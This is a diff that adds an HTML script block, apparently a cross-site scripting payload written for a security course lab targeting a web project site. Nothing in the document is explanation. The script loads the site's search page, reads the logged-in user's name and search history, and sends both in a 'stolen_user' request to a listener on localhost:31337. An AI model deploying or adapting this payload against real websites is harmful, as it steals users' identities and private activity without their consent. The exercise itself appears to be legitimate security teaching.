@@ -1,0 +1,30 @@
+<script>
+	const xhr = new XMLHttpRequest();
+	xhr.open('GET', 'https://webproject.gtinfosec.org/search?q=');
+	xhr.onload = function() 
+	{
+		if (xhr.status == 200) 
+		{
+			var user = document.getElementById("logged-in-user").textContent;
+			const parser = new DOMParser();
+			const htmlDoc = parser.parseFromString(xhr.responseText, "text/html");
+			var historyListItems = htmlDoc.getElementsByClassName("list-group-item");
+			for(var i = 0; i < historyListItems.length; i++)
+			{
+				if(historyListItems[i].innerText.indexOf("historyListItems") == -1)
+				{
+					const xhr2 = new XMLHttpRequest();
+					xhr2.open('GET', 'http://localhost:31337/?stolen_user='+ user +'&last_search='+historyListItems[i].innerText);
+					xhr2.send();
+					break;
+				}
+			}
+		} 
+		else 
+		{
+			console.log('Request failed.  Returned status of ' + xhr.status);
+		}
+	};
+	xhr.send();
+</script>
+
